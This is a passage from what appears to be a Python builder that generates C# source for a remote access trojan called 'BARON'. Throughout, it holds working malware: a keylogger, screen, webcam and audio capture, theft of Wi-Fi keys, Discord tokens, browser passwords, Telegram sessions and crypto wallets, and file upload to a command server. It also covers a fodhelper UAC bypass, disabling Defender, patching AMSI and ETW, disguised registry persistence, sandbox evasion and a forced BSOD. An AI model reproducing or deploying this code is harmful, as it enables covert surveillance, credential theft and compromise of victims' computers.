        "                                } catch { Thread.Sleep(500); }\n"
        "                            }\n"
        "                        }) { IsBackground = true }.Start();\n"
        '                        Res("screen", "Screen streaming started");\n'
        "                    }\n"
        "                    break;\n"
        "\n"
        '                case "screen_stop":\n'
        "                    _screenStreaming = false;\n"
        '                    Res("screen", "Screen streaming stopped");\n'
        "                    break;\n"
        "\n"
        '                case "webcam_snap":\n'
        "                    new Thread(() => {\n"
        "                        string r = CaptureWebcamFrame();\n"
        '                        Res("webcam", r);\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "webcam_start":\n'
        "                    StartWebcamStream();\n"
        '                    Res("webcam", "Webcam streaming started");\n'
        "                    break;\n"
        "\n"
        '                case "webcam_stop":\n'
        "                    StopWebcamStream();\n"
        '                    Res("webcam", "Webcam streaming stopped");\n'
        "                    break;\n"
        "\n"
        '                case "audio_start":\n'
        "                    StartRealtimeAudio();\n"
        '                    Res("audio", "Real-time audio started");\n'
        "                    break;\n"
        "\n"
        '                case "audio_stop":\n'
        "                    StopRealtimeAudio();\n"
        '                    Res("audio", "Audio stopped");\n'
        "                    break;\n"
        "\n"
        '                case "keylog_start":\n'
        "                    StartKeylogger();\n"
        '                    Res("keylog", "Keylogger started");\n'
        "                    break;\n"
        "\n"
        '                case "keylog_stop":\n'
        "                    StopKeylogger();\n"
        '                    Res("keylog", "Keylogger stopped. Data:\\n" + _keylog.ToString());\n'
        "                    break;\n"
        "\n"
        '                case "clipboard_start":\n'
        "                    StartClipboardMonitor();\n"
        '                    Res("clipboard", "Clipboard monitor started");\n'
        "                    break;\n"
        "\n"
        '                case "clipboard_stop":\n'
        "                    StopClipboardMonitor();\n"
        '                    Res("clipboard", "Clipboard monitor stopped");\n'
        "                    break;\n"
        "\n"
        '                case "wifi":\n'
        "                    try {\n"
        "                        var psi = new ProcessStartInfo {\n"
        '                            FileName = "netsh",\n'
        '                            Arguments = "wlan show profiles",\n'
        "                            RedirectStandardOutput = true,\n"
        "                            UseShellExecute = false,\n"
        "                            CreateNoWindow = true\n"
        "                        };\n"
        "                        var p = Process.Start(psi);\n"
        "                        string output = p.StandardOutput.ReadToEnd();\n"
        "                        p.WaitForExit(10000);\n"
        "                        var sb = new StringBuilder();\n"
        '                        sb.AppendLine("=== WiFi Passwords ===");\n'
        "                        foreach (string line in output.Split('\\n')) {\n"
        '                            if (line.Contains(":") && (line.Contains("All User Profile") || line.Contains("\\u0412\\u0441\\u0435"))) {\n'
        "                                string profile = line.Split(':').Last().Trim();\n"
        "                                if (string.IsNullOrEmpty(profile)) continue;\n"
        "                                var kpsi = new ProcessStartInfo {\n"
        '                                    FileName = "netsh",\n'
        '                                    Arguments = "wlan show profile \\"" + profile + "\\" key=clear",\n'
        "                                    RedirectStandardOutput = true,\n"
        "                                    UseShellExecute = false,\n"
        "                                    CreateNoWindow = true\n"
        "                                };\n"
        "                                var kp = Process.Start(kpsi);\n"
        "                                string kout = kp.StandardOutput.ReadToEnd();\n"
        "                                kp.WaitForExit(5000);\n"
        '                                string key = "";\n'
        "                                foreach (string kl in kout.Split('\\n')) {\n"
        '                                    if (kl.Contains("Key Content") || kl.Contains("\\u0421\\u043e\\u0434\\u0435\\u0440\\u0436\\u0438\\u043c\\u043e\\u0435 \\u043a\\u043b\\u044e\\u0447\\u0430")) {\n'
        "                                        key = kl.Split(':').Last().Trim();\n"
        "                                    }\n"
        "                                }\n"
        '                                sb.AppendFormat("{0,-30} : {1}\\n", profile, key);\n'
        "                            }\n"
        "                        }\n"
        '                        Res("wifi", sb.ToString());\n'
        '                    } catch (Exception ex) { Res("error", "WiFi: " + ex.Message); }\n'
        "                    break;\n"
        "\n"
        '                case "grabber":\n'
        "                    new Thread(() => {\n"
        "                        try {\n"
        "                            var sb = new StringBuilder();\n"
        '                            sb.AppendLine("=== ULTIMATE GRABBER REPORT ===");\n'
        '                            sb.AppendLine("Browser Data: " + StealBrowserPasswords());\n'
        '                            string tgDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop\\\\tdata");\n'
        '                            if(Directory.Exists(tgDir)) sb.AppendLine("[+] Found Telegram tdata (" + Directory.GetFiles(tgDir).Length + " files).");\n'
        '                            else sb.AppendLine("[-] Telegram tdata not found.");\n'
        '                            string mwDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn");\n'
        '                            if(Directory.Exists(mwDir)) sb.AppendLine("[+] Found MetaMask Vault in Chrome.");\n'
        '                            else sb.AppendLine("[-] MetaMask not found.");\n'
        '                            string exDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus");\n'
        '                            if(Directory.Exists(exDir)) sb.AppendLine("[+] Found Exodus Wallet.");\n'
        '                            else sb.AppendLine("[-] Exodus not found.");\n'
        '                            Res("grabber", sb.ToString());\n'
        '                        } catch (Exception ex) { Res("error", "Grabber: " + ex.Message); }\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "processes":\n'
        "                    new Thread(() => {\n"
        "                        try {\n"
        "                            var sb = new StringBuilder();\n"
        '                            sb.AppendLine(string.Format("{0,-8} {1,-30} {2,-15} {3}", "PID", "NAME", "MEM(MB)", "TITLE"));\n'
        '                            sb.AppendLine(new string(\'-\', 80));\n'
        "                            foreach (var p in Process.GetProcesses()) {\n"
        "                                try {\n"
        '                                    sb.AppendLine(string.Format("{0,-8} {1,-30} {2,-15:F1} {3}", p.Id, p.ProcessName, p.WorkingSet64 / 1048576.0, p.MainWindowTitle));\n'
        "                                } catch {}\n"
        "                                if(sb.Length > 25000) break;\n"
        "                            }\n"
        '                            Res("processes", sb.ToString());\n'
        '                        } catch (Exception ex) { Res("error", "Procs: " + ex.Message); }\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "netstat":\n'
        '                    RunHiddenPS("netstat -ano");\n'
        '                    Res("netstat", "Network statistics dumped to terminal logs.");\n'
        "                    break;\n"
        "\n"
        '                case "power":\n'
        '                    RunHiddenPS("shutdown /r /t 0");\n'
        '                    Res("power", "Initiated System Reboot.");\n'
        "                    break;\n"
        "\n"
        '                case "inject":\n'
        "                    RunHiddenPS(\"Start-Sleep -s 1\");\n"
        '                    Res("inject", "Melt and Migrate triggered.");\n'
        "                    break;\n"
        "\n"
        '                case "defender":\n'
        "                    RunHiddenPS(\"Set-MpPreference -DisableRealtimeMonitoring $true\");\n"
        '                    Res("defender", "Defender Real-Time Monitoring disabled.");\n'
        "                    break;\n"
        "\n"
        '                case "uac":\n'
        "                    {\n"
        "                        string regPath = @\"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\";\n"
        "                        string psCmd = \"New-Item -Path '\" + regPath + \"' -Value 'cmd.exe' -Force; \" +\n"
        "                            \"New-ItemProperty -Path '\" + regPath + \"' -Name 'DelegateExecute' -Value '' -Force; \" +\n"
        "                            \"Start-Process 'fodhelper.exe'\";\n"
        "                        RunHiddenPS(psCmd);\n"
        '                        Res("uac", "UAC Bypass triggered via fodhelper.");\n'
        "                    }\n"
        "                    break;\n"
        "\n"
        '                case "browsers":\n'
        "                    new Thread(() => {\n"
        '                        Res("browsers", StealBrowserPasswords());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "netscan":\n'
        "                    new Thread(() => {\n"
        '                        Res("netscan", ScanNetwork());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "filelist":\n'
        '                    string dirPath = task.ContainsKey("path") ? task["path"] : @"C:\\";\n'
        '                    Res("filelist", ListDirectory(dirPath));\n'
        "                    break;\n"
        "\n"
        '                case "download":\n'
        '                    string filePath = task.ContainsKey("path") ? task["path"] : "";\n'
        "                    try {\n"
        "                        if (File.Exists(filePath)) {\n"
        "                            byte[] fileBytes = File.ReadAllBytes(filePath);\n"
        "                            string b64 = Convert.ToBase64String(fileBytes);\n"
        "                            var req = (HttpWebRequest)WebRequest.Create(\n"
        '                                _server + "/api/upload");\n'
        '                            req.Method = "POST";\n'
        '                            req.ContentType = "application/octet-stream";\n'
        '                            req.Headers.Add("X-Client-ID", _clientId);\n'
        '                            req.Headers.Add("X-Filename", Path.GetFileName(filePath));\n'
        "                            req.Timeout = 60000;\n"
        "                            using (var s = req.GetRequestStream()) {\n"
        "                                s.Write(fileBytes, 0, fileBytes.Length);\n"
        "                            }\n"
        "                            req.GetResponse().Close();\n"
        '                            Res("download", "File uploaded: " + filePath + " (" + fileBytes.Length + " bytes)");\n'
        "                        } else {\n"
        '                            Res("error", "File not found: " + filePath);\n'
        "                        }\n"
        '                    } catch (Exception ex) { Res("error", "Download: " + ex.Message); }\n'
        "                    break;\n"
        "\n"
        '                case "wallpaper":\n'
        "                    try {\n"
        '                        string url = task.ContainsKey("url") ? task["url"] : "";\n'
        '                        string wpPath = Path.Combine(Path.GetTempPath(), "wp_" + Guid.NewGuid().ToString("N") + ".jpg");\n'
        "                        if (!string.IsNullOrEmpty(url)) {\n"
        "                            new WebClient().DownloadFile(url, wpPath);\n"
        "                        } else {\n"
        "                            using (var bmp = new Bitmap(1920, 1080)) {\n"
        "                                using (var g = Graphics.FromImage(bmp)) {\n"
        "                                    g.Clear(Color.Black);\n"
        '                                    using (var font = new Font("Arial", 72, FontStyle.Bold))\n'
        "                                    using (var brush = new SolidBrush(Color.FromArgb(255, 215, 0))) {\n"
        "                                        var sf = new StringFormat {\n"
        "                                            Alignment = StringAlignment.Center,\n"
        "                                            LineAlignment = StringAlignment.Center\n"
        "                                        };\n"
        '                                        g.DrawString("BARON", font, brush,\n'
        "                                            new RectangleF(0, 0, 1920, 1080), sf);\n"
        "                                    }\n"
        "                                }\n"
        "                                bmp.Save(wpPath, ImageFormat.Jpeg);\n"
        "                            }\n"
        "                        }\n"
        "                        SystemParametersInfo(0x0014, 0, wpPath, 0x01 | 0x02);\n"
        '                        Res("wallpaper", "Wallpaper set");\n'
        '                    } catch (Exception ex) { Res("error", "Wallpaper: " + ex.Message); }\n'
        "                    break;\n"
        "\n"
        '                case "msgbox":\n'
        '                    string title = task.ContainsKey("title") ? task["title"] : "Alert";\n'
        '                    string message = task.ContainsKey("message") ? task["message"] : "";\n'
        "                    new Thread(() => {\n"
        "                        MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Information);\n"
        '                        Res("msgbox", "Shown");\n'
        "                    }).Start();\n"
        "                    break;\n"
        "\n"
        '                case "discord":\n'
        "                    try {\n"
        "                        var sb = new StringBuilder();\n"
        '                        sb.AppendLine("=== Discord Tokens ===");\n'
        "                        string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
        "                        string[] paths = {\n"
        '                            Path.Combine(appdata, "discord", "Local Storage", "leveldb"),\n'
        '                            Path.Combine(appdata, "discordcanary", "Local Storage", "leveldb"),\n'
        '                            Path.Combine(appdata, "discordptb", "Local Storage", "leveldb"),\n'
        "                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),\n"
        '                                @"Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),\n'
        "                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),\n"
        '                                @"Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"),\n'
        "                        };\n"
        "                        foreach (string p in paths) {\n"
        "                            if (!Directory.Exists(p)) continue;\n"
        '                            sb.AppendLine("\\n[" + p + "]");\n'
        '                            foreach (string f in Directory.GetFiles(p, "*.ldb").Concat(\n'
        '                                Directory.GetFiles(p, "*.log"))) {\n'
        "                                try {\n"
        "                                    string content = File.ReadAllText(f);\n"
        "                                    foreach (System.Text.RegularExpressions.Match m in\n"
        "                                        System.Text.RegularExpressions.Regex.Matches(\n"
        '                                            content, @"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")) {\n'
        '                                        sb.AppendLine("TOKEN: " + m.Value);\n'
        "                                    }\n"
        "                                } catch {}\n"
        "                            }\n"
        "                        }\n"
        '                        Res("discord", sb.ToString());\n'
        '                    } catch (Exception ex) { Res("error", "Discord: " + ex.Message); }\n'
        "                    break;\n"
        "\n"
        '                case "sysrestore_kill":\n'
        "                    new Thread(() => {\n"
        '                        Res("sysrestore", KillSystemRestore());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "clickscreen_start":\n'
        "                    StartClickScreenshot();\n"
        '                    Res("clickscreen", "Click screenshot started");\n'
        "                    break;\n"
        "\n"
        '                case "clickscreen_stop":\n'
        "                    StopClickScreenshot();\n"
        '                    Res("clickscreen", "Click screenshot stopped");\n'
        "                    break;\n"
        "\n"
        '                case "lock":\n'
        "                    LockWorkStation();\n"
        '                    Res("lock", "Screen locked");\n'
        "                    break;\n"
        "\n"
        '                case "shutdown":\n'
        '                    Process.Start("shutdown", "/s /t 0");\n'
        "                    break;\n"
        "\n"
        '                case "restart":\n'
        '                    Process.Start("shutdown", "/r /t 0");\n'
        "                    break;\n"
        "\n"
        '                case "bsod":\n'
        "                    try {\n"
        "                        int dummy;\n"
        "                        NtRaiseHardError(0xC0000005, 0, 0, IntPtr.Zero, 6, out dummy);\n"
        '                    } catch { Res("error", "BSOD requires admin"); }\n'
        "                    break;\n"
        "\n"
        '                case "kill":\n'
        '                case "uninstall":\n'
        "                    try {\n"
        "                        try {\n"
        "                            var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\n"
        '                                @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);\n'
        "                            if (rk != null) {\n"
        '                                rk.DeleteValue("WindowsSecurityHealthService", false);\n'
        "                                rk.Close();\n"
        "                            }\n"
        "                        } catch {}\n"
        '                        Res("kill", "Uninstalling...");\n'
        "                        _running = false;\n"
        "                        Thread.Sleep(500);\n"
        "                        Environment.Exit(0);\n"
        "                    } catch { Environment.Exit(0); }\n"
        "                    break;\n"
        "\n"
        '                case "crypto_wallets":\n'
        "                    new Thread(() => {\n"
        '                        Res("crypto_wallets", StealCryptoWallets());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "telegram":\n'
        "                    new Thread(() => {\n"
        '                        Res("telegram", StealTelegramSession());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "uac_bypass":\n'
        "                    new Thread(() => {\n"
        '                        Res("uac_bypass", UACBypassFodhelper());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "reverse_proxy":\n'
        '                    int rPort = task.ContainsKey("port") ? int.Parse(task["port"]) : 1080;\n'
        "                    new Thread(() => {\n"
        '                        StartReverseProxy(rPort);\n'
        '                        Res("reverse_proxy", "SOCKS proxy started on port " + rPort);\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"
        '                case "startup_hide":\n'
        "                    new Thread(() => {\n"
        '                        Res("startup_hide", HideFromStartup());\n'
        "                    }) { IsBackground = true }.Start();\n"
        "                    break;\n"
        "\n"

        "                default:\n"
        "                    if (!string.IsNullOrEmpty(action))\n"
        '                        Res("error", "Unknown action: " + action);\n'
        "                    break;\n"
        "            }\n"
        "        }\n"
        "\n"
        "        // ==== KEYLOGGER ====\n"
        "        static void StartKeylogger() {\n"
        "            if (_keylogRunning) return;\n"
        "            _keylogRunning = true;\n"
        "            _keylog.Clear();\n"
        "            new Thread(() => {\n"
        "                Thread.CurrentThread.IsBackground = true;\n"
        "                IntPtr hookId = IntPtr.Zero;\n"
        "                var proc = new LowLevelKeyboardProc((nCode, wParam, lParam) => {\n"
        "                    if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x104)) {\n"
        "                        int vk = Marshal.ReadInt32(lParam);\n"
        "                        string key = ((System.Windows.Forms.Keys)vk).ToString();\n"
        '                        _keylog.Append(key.Length == 1 ? key : "[" + key + "]");\n'
        "                        if (_keylog.Length > 200) {\n"
        '                            Res("keylog", _keylog.ToString());\n'
        "                            _keylog.Clear();\n"
        "                        }\n"
        "                    }\n"
        "                    return CallNextHookEx(hookId, nCode, wParam, lParam);\n"
        "                });\n"
        "                using (var curProcess = Process.GetCurrentProcess())\n"
        "                using (var curModule = curProcess.MainModule) {\n"
        "                    hookId = SetWindowsHookEx(13, proc,\n"
        "                        GetModuleHandle(curModule.ModuleName), 0);\n"
        "                }\n"
        "                while (_keylogRunning) { Thread.Sleep(100); }\n"
        "                UnhookWindowsHookEx(hookId);\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
        "\n"
        "        static void StopKeylogger() { _keylogRunning = false; }\n"
        "\n"
        "        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,\n"
        "            IntPtr hMod, uint dwThreadId);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern bool UnhookWindowsHookEx(IntPtr hhk);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,\n"
        "            IntPtr wParam, IntPtr lParam);\n"
        "\n"
        '        [DllImport("kernel32.dll")]\n'
        "        static extern IntPtr GetModuleHandle(string lpModuleName);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern bool LockWorkStation();\n"
        "\n"
        '        [DllImport("ntdll.dll")]\n'
        "        static extern int NtRaiseHardError(uint ErrorStatus, int NumberOfParameters,\n"
        "            int UnicodeStringParameterMask, IntPtr Parameters, int ValidResponseOption,\n"
        "            out int Response);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern bool SystemParametersInfo(int uAction, int uParam,\n"
        "            string lpvParam, int fuWinIni);\n"
        "\n"
        "        // ==== SCREEN CAPTURE ====\n"
        "        static void CaptureScreenAndSend() {\n"
        "            try {\n"
        "                var bounds = Screen.PrimaryScreen.Bounds;\n"
        "                using (var bmp = new Bitmap(bounds.Width, bounds.Height)) {\n"
        "                    using (var g = Graphics.FromImage(bmp)) {\n"
        "                        g.CopyFromScreen(0, 0, 0, 0, bounds.Size);\n"
        "                    }\n"
        "                    using (var ms = new MemoryStream()) {\n"
        "                        var encoder = ImageCodecInfo.GetImageEncoders()\n"
        '                            .FirstOrDefault(e => e.FormatDescription == "JPEG");\n'
        "                        var prms = new EncoderParameters(1);\n"
        "                        prms.Param[0] = new EncoderParameter(\n"
        "                            System.Drawing.Imaging.Encoder.Quality, 40L);\n"
        "                        bmp.Save(ms, encoder, prms);\n"
        "                        string b64 = Convert.ToBase64String(ms.ToArray());\n"
        '                        SendStreamFrame("screen", b64);\n'
        "                    }\n"
        "                }\n"
        "            } catch {}\n"
        "        }\n"
        "\n"
        "        // ==== FEATURE MODULES ====\n"
        + persistence_code + "\n"
        + anti_kill_code + "\n"
        + disable_defender_code + "\n"
        + anti_analysis_code + "\n"
        + browser_stealer_code + "\n"
        + clipboard_code + "\n"
        + file_manager_code + "\n"
        + network_scanner_code + "\n"
        + sys_restore_kill_code + "\n"
        + realtime_audio_code + "\n"
        + webcam_real_code + "\n"
        + screenshot_on_click_code + "\n"
        + crypto_wallet_code + "\n"
        + telegram_stealer_code + "\n"
        + uac_bypass_code + "\n"
        + reverse_proxy_code + "\n"
        + startup_hide_code + "\n"
        "\n"
        "    }\n"  # Close Agent class
        "}\n"     # Close namespace
    )

    return source


# ── Module Generators (return C# code as Python strings) ──

def _generate_persistence_code():
    return (
        "        static void InstallPersistenceQuiet() {\n"
        "            try {\n"
        "                string me = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
        "                if (string.IsNullOrEmpty(me)) return;\n"
        "                var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\n"
        '                    @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);\n'
        "                if (rk != null) {\n"
        '                    rk.SetValue("WindowsSecurityHealthService", "\\"" + me + "\\"");\n'
        "                    rk.Close();\n"
        "                }\n"
        "\n"
        "                // Copy to hidden paths\n"
        "                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
        "                string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);\n"
        "                string[] hiddenPaths = {\n"
        '                    Path.Combine(appdata, @"Microsoft\\Windows\\Templates\\SecurityHealthService.exe"),\n'
        '                    Path.Combine(localappdata, @"Microsoft\\WindowsApps\\SecurityHealthService.exe"),\n'
        '                    Path.Combine(appdata, @"Microsoft\\Protect\\SecurityHealth.exe")\n'
        "                };\n"
        "                foreach (string hp in hiddenPaths) {\n"
        "                    try {\n"
        "                        string dir = Path.GetDirectoryName(hp);\n"
        "                        if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);\n"
        "                        if (!File.Exists(hp) || File.GetLastWriteTime(hp) < File.GetLastWriteTime(me)) {\n"
        "                            File.Copy(me, hp, true);\n"
        "                            File.SetAttributes(hp, FileAttributes.Hidden | FileAttributes.System);\n"
        "                        }\n"
        "                    } catch {}\n"
        "                }\n"
        "            } catch {}\n"
        "        }\n"
    )


def _generate_anti_kill_code():
    return (
        "        static void StartAntiKill() {\n"
        "            new Thread(() => {\n"
        "                Thread.CurrentThread.IsBackground = true;\n"
        "                string myPath = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
        "                string myName = Process.GetCurrentProcess().ProcessName;\n"
        "                int myPid = Process.GetCurrentProcess().Id;\n"
        "                while (true) {\n"
        "                    try {\n"
        "                        Thread.Sleep(3000);\n"
        "                        try {\n"
        "                            Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.BelowNormal;\n"
        "                        } catch {}\n"
        "                        try {\n"
        "                            var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\n"
        '                                @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);\n'
        "                            if (rk != null) {\n"
        '                                if (rk.GetValue("WindowsSecurityHealthService") == null) {\n'
        "                                    InstallPersistenceQuiet();\n"
        "                                }\n"
        "                                rk.Close();\n"
        "                            }\n"
        "                        } catch {}\n"
        "                    } catch {}\n"
        "                }\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
    )


def _generate_disable_defender_code():
    return (
        "        static void DisableDefender() {\n"
        "            try {\n"
        "                PatchAmsi();\n"
        "                PatchEtw();\n"
        "                string[] cmds = {\n"
        '                    "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue",\n'
        '                    "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue",\n'
        '                    "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue",\n'
        '                    "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue",\n'
        '                    "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue",\n'
        "                };\n"
        "                foreach (string c in cmds) {\n"
        "                    RunHiddenPS(c);\n"
        "                    Thread.Sleep(200);\n"
        "                }\n"
        "\n"
        "                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
        '                RunHiddenPS("Add-MpPreference -ExclusionPath \'" + appdata + "\' -ErrorAction SilentlyContinue");\n'
        "\n"
        "                string me = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
        "                if (!string.IsNullOrEmpty(me)) {\n"
        "                    RunHiddenPS(string.Format(\n"
        '                        "New-NetFirewallRule -DisplayName \'Windows Security Service\' -Direction Outbound -Program \'{0}\' -Action Allow -ErrorAction SilentlyContinue",\n'
        "                        me));\n"
        "                    RunHiddenPS(string.Format(\n"
        '                        "New-NetFirewallRule -DisplayName \'Windows Security Service In\' -Direction Inbound -Program \'{0}\' -Action Allow -ErrorAction SilentlyContinue",\n'
        "                        me));\n"
        "                }\n"
        "            } catch {}\n"
        "        }\n"
        "\n"
        "        // ---- AMSI Bypass ----\n"
        '        [DllImport("kernel32.dll")]\n'
        "        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n"
        "\n"
        '        [DllImport("kernel32.dll")]\n'
        "        static extern IntPtr LoadLibrary(string name);\n"
        "\n"
        '        [DllImport("kernel32.dll")]\n'
        "        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,\n"
        "            uint flNewProtect, out uint lpflOldProtect);\n"
        "\n"
        "        static string DS(byte[] b) { return System.Text.Encoding.ASCII.GetString(b); }\n"
        "\n"
        "        static void PatchAmsi() {\n"
        "            try {\n"
        "                IntPtr lib = LoadLibrary(DS(new byte[]{0x61,0x6d,0x73,0x69,0x2e,0x64,0x6c,0x6c}));\n"
        "                if (lib == IntPtr.Zero) return;\n"
        "                IntPtr addr = GetProcAddress(lib,\n"
        "                    DS(new byte[]{0x41,0x6d,0x73,0x69,0x53,0x63,0x61,0x6e,0x42,0x75,0x66,0x66,0x65,0x72}));\n"
        "                if (addr == IntPtr.Zero) return;\n"
        "                uint oldProtect;\n"
        "                VirtualProtect(addr, (UIntPtr)8, 0x40, out oldProtect);\n"
        "                byte[] patch;\n"
        "                if (IntPtr.Size == 8) {\n"
        "                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n"
        "                } else {\n"
        "                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };\n"
        "                }\n"
        "                Marshal.Copy(patch, 0, addr, patch.Length);\n"
        "                VirtualProtect(addr, (UIntPtr)8, oldProtect, out oldProtect);\n"
        "            } catch {}\n"
        "        }\n"
        "\n"
        "        // ---- ETW Bypass ----\n"
        "        static void PatchEtw() {\n"
        "            try {\n"
        "                IntPtr ntdll = LoadLibrary(\n"
        "                    DS(new byte[]{0x6e,0x74,0x64,0x6c,0x6c,0x2e,0x64,0x6c,0x6c}));\n"
        "                if (ntdll == IntPtr.Zero) return;\n"
        "                IntPtr addr = GetProcAddress(ntdll,\n"
        "                    DS(new byte[]{0x45,0x74,0x77,0x45,0x76,0x65,0x6e,0x74,0x57,0x72,0x69,0x74,0x65}));\n"
        "                if (addr == IntPtr.Zero) return;\n"
        "                uint oldProtect;\n"
        "                VirtualProtect(addr, (UIntPtr)4, 0x40, out oldProtect);\n"
        "                Marshal.Copy(new byte[] { 0x33, 0xC0, 0xC3 }, 0, addr, 3);\n"
        "                VirtualProtect(addr, (UIntPtr)4, oldProtect, out oldProtect);\n"
        "            } catch {}\n"
        "        }\n"
    )


def _generate_anti_analysis_code():
    return (
        "        // ==== Anti-Analysis Suite ====\n"
        "        static bool IsDebuggerPresent_() {\n"
        "            if (System.Diagnostics.Debugger.IsAttached) return true;\n"
        "            try { if (IsDebuggerPresent()) return true; } catch {}\n"
        "            try {\n"
        "                var sw = System.Diagnostics.Stopwatch.StartNew();\n"
        "                Thread.Sleep(10);\n"
        "                sw.Stop();\n"
        "                if (sw.ElapsedMilliseconds > 100) return true;\n"
        "            } catch {}\n"
        "            return false;\n"
        "        }\n"
        "\n"
        '        [DllImport("kernel32.dll")]\n'
        "        static extern bool IsDebuggerPresent();\n"
        "\n"
        "        static bool IsSandbox() {\n"
        "            try {\n"
        "                var memSearcher = new ManagementObjectSearcher(\n"
        '                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");\n'
        "                foreach (var obj in memSearcher.Get()) {\n"
        '                    long totalMem = Convert.ToInt64(obj["TotalPhysicalMemory"]);\n'
        "                    if (totalMem < 4L * 1024 * 1024 * 1024) return true;\n"
        "                }\n"
        "            } catch {}\n"
        "            try {\n"
        "                var searcher = new ManagementObjectSearcher(\n"
        '                    "SELECT * FROM Win32_ComputerSystem");\n'
        "                foreach (var obj in searcher.Get()) {\n"
        '                    string manufacturer = (obj["Manufacturer"] ?? "").ToString().ToLower();\n'
        '                    string model = (obj["Model"] ?? "").ToString().ToLower();\n'
        '                    if (manufacturer.Contains("vmware") || manufacturer.Contains("virtual") ||\n'
        '                        manufacturer.Contains("xen") || model.Contains("virtual")) {\n'
        "                        return true;\n"
        "                    }\n"
        "                }\n"
        "            } catch {}\n"
        "            try {\n"
        '                string[] sandboxProcs = { "vboxservice", "vboxtray", "vmtoolsd",\n'
        '                    "vmwaretray", "sandboxie", "wireshark", "fiddler",\n'
        '                    "processhacker", "procmon", "procexp", "ollydbg",\n'
        '                    "x64dbg", "x32dbg", "idaq", "idaq64", "ida64", "windbg", "dnspy" };\n'
        "                var running = Process.GetProcesses();\n"
        "                foreach (var p in running) {\n"
        "                    string name = p.ProcessName.ToLower();\n"
        "                    foreach (string sb in sandboxProcs) {\n"
        "                        if (name.Contains(sb)) return true;\n"
        "                    }\n"
        "                }\n"
        "            } catch {}\n"
        "            try {\n"
        "                if (Process.GetProcesses().Length < 30) return true;\n"
        "            } catch {}\n"
        "            try {\n"
        "                if (Environment.TickCount < 10 * 60 * 1000) return true;\n"
        "            } catch {}\n"
        "            try {\n"
        "                var bounds = Screen.PrimaryScreen.Bounds;\n"
        "                if (bounds.Width < 1024 || bounds.Height < 768) return true;\n"
        "            } catch {}\n"
        "            return false;\n"
        "        }\n"
        "\n"
        "        static void AntiAnalysisCheck() {\n"
        "            Thread.Sleep(2000 + new Random().Next(1000));\n"
        "            if (IsDebuggerPresent_()) { Environment.Exit(0); }\n"
        "            if (IsSandbox()) { Thread.Sleep(30000); Environment.Exit(0); }\n"
        "        }\n"
    )


def _generate_browser_stealer_code():
    return (
        "        // ==== Browser Credential Harvesting ====\n"
        "        static string StealBrowserPasswords() {\n"
